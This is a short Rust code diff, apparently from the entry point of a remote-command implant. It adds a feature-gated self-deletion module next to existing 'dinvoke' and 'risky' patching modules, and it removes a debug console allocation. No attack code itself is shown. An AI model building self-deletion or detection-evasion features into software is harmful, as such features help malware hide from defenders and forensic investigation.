@@ -15,16 +15,16 @@ pub(crate) mod dinvoke;
 #[cfg(feature = "risky")]
 pub(crate) mod patches;
 
+#[cfg(feature = "selfdelete")]
+pub(crate) mod self_delete;
+
 use crate::app::client::Client;
 use crate::app::commands::handle_command;
 use crate::app::config::Config;
-use crate::app::debug::{allocate_console_debug_only, debug_println};
+use crate::app::debug::debug_println;
 use rand::Rng;
 
 pub fn main() {
-    // Allocate a console if we're in debug mode
-    allocate_console_debug_only();
-
     // Create a new Config object
     let config = Config::new().unwrap_or_else(|_e| {
         debug_println!("Failed to initialize config: {_e}");
